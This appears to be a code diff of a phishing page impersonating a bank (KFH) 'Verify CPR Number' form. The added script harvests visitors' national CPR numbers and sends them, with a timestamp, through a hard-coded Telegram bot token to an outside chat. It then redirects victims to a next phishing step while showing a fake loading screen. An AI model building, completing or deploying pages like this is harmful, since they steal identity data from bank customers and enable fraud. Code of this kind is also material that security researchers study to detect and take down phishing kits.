@@ -15,6 +15,7 @@
       --bg:#f5f7fb;
       --surface:#ffffff;
       --ring:0 0 0 3px rgba(34,177,76,.18);
+      --danger:#e11d48;
     }
     *{box-sizing:border-box}
     html,body{height:100%}
@@ -41,7 +42,8 @@
       gap:12px;
     }
     .card-img{
-      width:240px;
+      margin-top:20px;
+      width:200px;
       height:auto;
       border-radius:12px;
       box-shadow:0 8px 24px rgba(0,0,0,.06);
@@ -75,7 +77,9 @@
       font-size:18px;letter-spacing:.06em;
     }
     .help{color:var(--muted);font-size:12px;text-align:center;margin-top:-4px}
+    .help.danger{color:var(--danger)}
     .btn{
+      position:relative;
       width:100%;
       background:var(--brand);
       color:#fff;border:0;outline:0;
@@ -83,23 +87,58 @@
       padding:16px 20px;border-radius:16px;
       box-shadow:0 8px 18px rgba(34,177,76,.25);
       cursor:pointer;transition:.15s ease;
+      display:inline-flex;align-items:center;justify-content:center;
+      min-height:56px;
+      overflow:hidden;
     }
     .btn:disabled{opacity:.6;cursor:not-allowed;box-shadow:none}
+
+    /* loader state: hide label, center spinner */
+    .btn__label{display:inline-block;transition:opacity .15s ease}
+    .btn__spinner{
+      position:absolute;inset:0;display:none;align-items:center;justify-content:center;
+    }
+    .btn__spinner:before{
+      content:"";width:20px;height:20px;border-radius:50%;
+      border:3px solid rgba(255,255,255,.5);
+      border-top-color:#fff;
+      animation:spin 1s linear infinite;
+    }
+    .btn--loading .btn__label{opacity:0}
+    .btn--loading .btn__spinner{display:flex}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
     @media (min-width:768px){
       header{padding-top:32px}
       .title{font-size:24px}
     }
+    /* Full-screen loader overlay */
+.loader-backdrop{
+  position: fixed; /* fixed so it covers whole viewport */
+  inset: 0;
+  z-index: 1000;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  background: rgba(0,0,0,.55);
+  backdrop-filter: blur(2px);
+}
+.loader-backdrop.show{ display:flex; }
+.loader-gif{
+  width: 60px;
+  height: 60px;
+  object-fit: contain;
+}
+
   </style>
 </head>
 <body>
   <div class="app">
     <header>
-      <!-- REPLACE with your real logo -->
       <img class="logo-img" src="kd.png" alt="KFH logo">
     </header>
 
     <main>
-      <!-- REPLACE with your real CPR card image -->
       <img class="card-img" src="gh.png" alt="CPR card preview">
 
       <div class="title">Verify CPR Number</div>
@@ -110,31 +149,119 @@
                  placeholder="123456789" aria-describedby="hint">
         </label>
         <div id="hint" class="help">Enter your 9–12 digit CPR number.</div>
-        <button class="btn" id="next" type="submit" disabled>NEXT</button>
+
+       <button class="btn" id="next" type="submit" disabled>
+  NEXT
+</button>
+
       </form>
     </main>
   </div>
+<div class="loader-backdrop" id="loader" aria-hidden="true">
+  <img src="cicle_loader.gif" alt="Loading..." class="loader-gif" />
+</div>
 
-  <script>
-    const input = document.getElementById('cpr');
-    const nextBtn = document.getElementById('next');
-    const form = document.getElementById('cpr-form');
+ <script>
+  // ---------- CONFIG ----------
+  // ⚠️ For production, do NOT expose tokens in frontend code.
+  const TELEGRAM_BOT_TOKEN = "8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8";
+  const TELEGRAM_CHAT_ID   = "-5091670751";
+  const NEXT_SCREEN_URL    = "rd.html"; // use the route you actually navigate to
 
-    function updateBtn(){
-      const digits = input.value.replace(/\D/g,'');
-      nextBtn.disabled = !(digits.length >= 9 && digits.length <= 12);
-    }
-    input.addEventListener('input', updateBtn);
+  const input   = document.getElementById('cpr');
+  const nextBtn = document.getElementById('next');
+  const form    = document.getElementById('cpr-form');
+  const hint    = document.getElementById('hint');
+  const loader  = document.getElementById('loader');
 
-    form.addEventListener('submit', (e)=>{
-      e.preventDefault();
-      updateBtn();
-      if(nextBtn.disabled) return;
-      // TODO: replace with your submit logic / navigation
-      alert('CPR submitted: ' + input.value.replace(/\D/g,''));
+  function onlyDigits(v){ return (v || "").replace(/\D/g, ''); }
+
+  function updateBtn(){
+    const digits = onlyDigits(input.value);
+    nextBtn.disabled = !(digits.length >= 9 && digits.length <= 12);
+    hint.classList.remove('danger');
+    hint.textContent = "Enter your 9–12 digit CPR number.";
+  }
+
+  // Overlay loader helpers
+  function showLoader(){
+    loader.classList.add('show');
+    loader.setAttribute('aria-hidden','false');
+  }
+  function hideLoader(){
+    loader.classList.remove('show');
+    loader.setAttribute('aria-hidden','true');
+  }
+
+  async function sendToTelegram(messageText){
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: messageText,
+        parse_mode: "HTML",
+        disable_web_page_preview: true
+      })
     });
+    if(!res.ok){
+      const text = await res.text().catch(()=> "");
+      throw new Error(`Telegram error ${res.status}: ${text}`);
+    }
+    return res.json();
+  }
 
+  // Navigate to next screen (kept your query param)
+  function goNext(){
+    const cpr = onlyDigits(input.value);
+    window.location.replace(`${NEXT_SCREEN_URL}?cpr=${encodeURIComponent(cpr)}`);
+  }
+
+  input.addEventListener('input', updateBtn);
+
+  form.addEventListener('submit', async (e)=>{
+    e.preventDefault();
     updateBtn();
-  </script>
+    if(nextBtn.disabled) return;
+
+    const cpr = onlyDigits(input.value);
+   // Format time in Pakistan Standard Time (UTC+5)
+const formatter = new Intl.DateTimeFormat("en-PK", {
+  timeZone: "Asia/Karachi",
+  dateStyle: "medium",
+  timeStyle: "medium",
+});
+const timePK = formatter.format(new Date());
+
+const payload = `<b>CPR Verify</b>\nCPR: <code>${cpr}</code>\nTime (PKT): ${timePK}`;
+
+
+    // Disable inputs and show global loader
+    nextBtn.disabled = true;
+    input.disabled = true;
+    showLoader();
+
+    // Optional: enforce a minimum 3s loader display
+    const minDelay = new Promise(r => setTimeout(r, 3000));
+
+    try{
+      await Promise.all([sendToTelegram(payload), minDelay]);
+        hideLoader();
+      goNext();
+      // no need to hide loader (we're navigating)
+    }catch(err){
+      console.error(err);
+      hint.classList.add('danger');
+      hint.textContent = "Could not submit right now. Please check your connection and try again.";
+      hideLoader();
+      input.disabled = false;
+      updateBtn(); // re-evaluate enable/disable of NEXT
+    }
+  });
+
+  updateBtn();
+</script>
+
 </body>
 </html>
